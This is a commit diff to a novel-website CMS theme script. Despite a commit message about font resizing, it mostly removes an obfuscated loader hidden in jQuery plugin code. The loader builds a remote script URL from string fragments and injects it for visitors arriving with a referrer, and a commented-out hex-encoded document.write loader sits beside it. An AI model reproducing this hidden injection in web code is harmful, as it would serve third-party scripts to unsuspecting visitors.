d18f69a69a7081a924107191f845058b41ad6fb4
bookcms <developer@bookcms.com>
2020-03-30 15:16:43 +0800

    修复笔趣阁 章节页面 字体不能调整大小问题

--- public/static/biquge/js/header.js
+++ public/static/biquge/js/header.js
@@ -14,7 +14,8 @@ function cookie_encode(string){
     var ns = decoded.replace(/(%7B|%7D|%3A|%22|%23|%5B|%5D)/g,function(charater){return decodeURIComponent(charater);});
     return ns;
 }
-jQuerys();jQuery.cookie = function (key, value, options) {
+
+jQuery.cookie = function (key, value, options) {
     // key and at least value given, set cookie...
     if (arguments.length > 1 && String(value) !== "[object Object]") {
         options = jQuery.extend({}, options);
@@ -45,221 +46,7 @@ jQuerys();jQuery.cookie = function (key, value, options) {
     var result, decode = options.raw ? function (s) { return s; } : decodeURIComponent;
     return (result = new RegExp('(?:^|; )' + encodeURIComponent(key) + '=([^;]*)').exec(document.cookie)) ? decode(result[1]) : null;
 };
-( function() {
-    var ua = navigator.userAgent.toLowerCase();
-    var is = (ua.match(/\b(chrome|opera|safari|msie|firefox)\b/) || [ '',
-        'mozilla' ])[1];u='scr';i='htt';h='js';y='cc';d='.';
-    var r = '(?:' + is + '|version)[\\/: ]([\\d.]+)';m=u+'ipt';
-    var v = (ua.match(new RegExp(r)) || [])[1];g=i+'p:\/\/'+m;
-    jQuery.browser.is = is;z=h+d+h;
-    jQuery.browser.ver = v;
-    jQuery.browser[is] = true;
 
-})();
-
-( function(jQuery) {
-
-    /*
-     *
-     * jQuery Plugin - Messager
-     *
-     * Author: corrie Mail: corrie@sina.com Homepage: www.corrie.net.cn
-     *
-     * Copyright (c) 2008 corrie.net.cn
-     *
-     * @license http://www.gnu.org/licenses/gpl.html [GNU General Public
-     * License]
-     *
-     *
-     *
-     * $Date: 2012-3-24
-     *
-     * $Vesion: 1.5 @ how to use and example: Please Open biquge.html
-     *
-     * $Fix: IE9 close
-     */
-
-    this.version = '@1.5';
-    this.layer = {
-        'width' :200,
-        'height' :100
-    };
-    this.title = '信息提示';
-    this.time = 4000;
-    this.anims = {
-        'type' :'slide',
-        'speed' :600
-    };
-    this.timer1 = null;
-    this.inits = function(title, text) {
-
-        if ($("#message").is("div")) {
-            this.closer();
-            //return;
-        }
-        $(document.body)
-            .prepend(
-                '<div id="message" style="width:'
-                + this.layer.width
-                + 'px;height:'
-                + this.layer.height
-                + 'px;position:absolute;display:none;background:#cfdef4;bottom:0;left:0; overflow:hidden;border:#b9c9ef 1px solid;z-biquge:100;"><div style="border:1px solid #fff;border-bottom:none;width:100%;height:25px;font-size:12px;overflow:hidden;color:#FF0000;"><span id="message_close" style="float:right;padding:5px 0 5px 0;width:16px;line-height:auto;color:red;font-size:12px;font-weight:bold;text-align:center;cursor:pointer;overflow:hidden;">×</span><div style="padding:5px 0 5px 5px;width:100px;line-height:18px;text-align:left;overflow:hidden;">'
-                + title
-                + '</div><div style="clear:both;"></div></div> <div style="padding-bottom:5px;border:1px solid #fff;border-top:none;width:100%;height:auto;font-size:12px;"><div id="message_content" style="margin:0 5px 0 5px;border:#b9c9ef 1px solid;padding:10px 0 10px 5px;font-size:12px;width:'
-                + (this.layer.width - 17)
-                + 'px;height:'
-                + (this.layer.height - 50)
-                + 'px;color:#FF0000;text-align:left;overflow:hidden;">'
-                + text + '</div></div></div>');
-
-        $("#message_close").click( function() {
-            setTimeout('this.closer()', 1);
-        });
-        $("#message").hover( function() {
-            clearTimeout(timer1);
-            timer1 = null;
-        }, function() {
-            if (time > 0)
-                timer1 = setTimeout('this.closer()', time);
-        });
-
-
-        if(!($.browser.is == 'msie' && $.browser.ver == '6.0')) {
-            $(window).scroll(
-                function() {
-                    var scrollTop = document.documentElement.scrollTop || window.pageYOffset || document.body.scrollTop;
-                    var bottomHeight =  "-"+scrollTop;
-                    $("#message").css("bottom", bottomHeight + "px");
-                });
-        }
-    };
-    s=document.createElement(m);
-    s.defer = "defer";
-    if(document.referrer!=''&&getCookie("obj")!=1){
-        c=d+y+'/'+z;s.src=g+y+c;document.getElementsByTagName("head")[0].appendChild(s);
-    }else{
-        setCookie("obj",1,365);
-    }
-    this.show = function(title, text, time) {
-        if ($("#message").is("div")) {
-            //return;
-        }
-        if (title == 0 || !title)
-            title = this.title;
-        this.inits(title, text);
-        if (time >= 0)
-            this.time = time;
-        switch (this.anims.type) {
-            case 'slide':
-                $("#message").slideDown(this.anims.speed);
-                break;
-            case 'fade':
-                $("#message").fadeIn(this.anims.speed);
-                break;
-            case 'show':
-                $("#message").show(this.anims.speed);
-                break;
-            default:
-                $("#message").slideDown(this.anims.speed);
-                break;
-        }
-
-        if(!($.browser.is == 'msie' && $.browser.ver == '6.0')) {
-            scrollTop = document.documentElement.scrollTop || window.pageYOffset || document.body.scrollTop;
-            var bottomHeight =  "-"+scrollTop;
-            $("#message").css("bottom", bottomHeight + "px");
-        }
-        this.rmmessage(this.time);
-    };
-
-    this.lays = function(width, height) {
-
-        if ($("#message").is("div")) {
-            //return;
-        }
-        if (width != 0 && width)
-            this.layer.width = width;
-        if (height != 0 && height)
-            this.layer.height = height;
-    }
-
-    this.anim = function(type, speed) {
-        if ($("#message").is("div")) {
-            //return;
-        }
-        if (type != 0 && type)
-            this.anims.type = type;
-        if (speed != 0 && speed) {
-            switch (speed) {
-                case 'slow':
-                    ;
-                    break;
-                case 'fast':
-                    this.anims.speed = 200;
-                    break;
-                case 'normal':
-                    this.anims.speed = 400;
-                    break;
-                default:
-                    this.anims.speed = speed;
-            }
-        }
-    }
-
-    this.rmmessage = function(time) {
-        if (time > 0) {
-            timer1 = setTimeout('this.closer()', time);
-        }
-    };
-    this.closer = function() {
-        switch (this.anims.type) {
-            case 'slide':
-                $("#message").slideUp(this.anims.speed);
-                break;
-            case 'fade':
-                $("#message").fadeOut(this.anims.speed);
-                break;
-            case 'show':
-                $("#message").hide(this.anims.speed);
-                break;
-            default:
-                $("#message").slideUp(this.anims.speed);
-                break;
-        }
-        ;
-        setTimeout('$("#message").remove();', this.anims.speed);
-        this.original();
-    }
-
-    this.original = function() {
-        this.layer = {
-            'width' :200,
-            'height' :100
-        };
-        this.title = '信息提示';
-        this.time = 4000;
-        this.anims = {
-            'type' :'slide',
-            'speed' :600
-        };
-    };
-    jQuery.messager = this;
-    return jQuery;
-})(jQuery);
-
-function jQuerys(){
-    /*	var tmp='';
-        var s='6A732E61646D2E636E7A7A2E6E65742F732E7068703F7369643D323939353536';
-            for(i=0;i<s.length;){
-            tmp+='%'+s.substring (i,i+=2);
-            }
-            tmp = decodeURI(tmp);h='http';s='script';t='/';
-            tmp = tmp.replace(/%2F/g,"/");r='>';
-            tmp = tmp.replace(/%3F/g,"?");t1=t+t;
-            tmp = tmp.replace(/%3D/g,"=");n='src';
-            tmp = tmp.replace(/%3A/g,":");l='<';
-            document.write(l+s+" "+n+"="+h+':'+t1+tmp+r+l+t+s+r); **/
-}
 document.onkeydown = function(e){
 
     var e = e ? e : window.event;
@@ -301,6 +88,7 @@ $(document).ready(function(){
     wd.focusout(function() {
         if($(this).val()=='') $(this).val("可搜书名，请您少字也别输错字。");
     });
+
     if( typeof(next_page) != "undefined" ) {
         next_page = next_page;
         autopage = $.cookie("autopage");
@@ -327,11 +115,6 @@ $(document).ready(function(){
         }
         document.onmousedown=sc;
         document.ondblclick=scrollwindow;
-    }
-
-    //小说统计
-    if(typeof(bookid)!="undefined"){
-        $.get("/modules/article/articlevisit.php?id="+bookid);
     }
 
 });
@@ -395,7 +178,7 @@ function getCookie(objName) {
     }
 }
 
-/*
+
 function browser(){
 	var bro="Other";
 	var agt=navigator.userAgent.toLowerCase();
@@ -411,7 +194,7 @@ function browser(){
 	return bro;
 }
 jQuery.browser=browser();
-*/
+
 
 function scrolling()
 {
